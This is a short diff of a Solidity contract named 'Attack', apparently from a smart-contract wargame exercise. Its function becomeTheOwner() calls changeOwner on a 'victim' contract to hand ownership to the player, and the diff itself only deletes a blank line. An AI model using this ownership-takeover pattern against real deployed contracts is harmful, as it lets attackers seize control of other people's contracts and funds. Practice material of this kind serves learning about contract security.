@@ -15,5 +15,4 @@ contract Attack {
     function becomeTheOwner() public {
         victim.changeOwner(player);
     }
-
 }
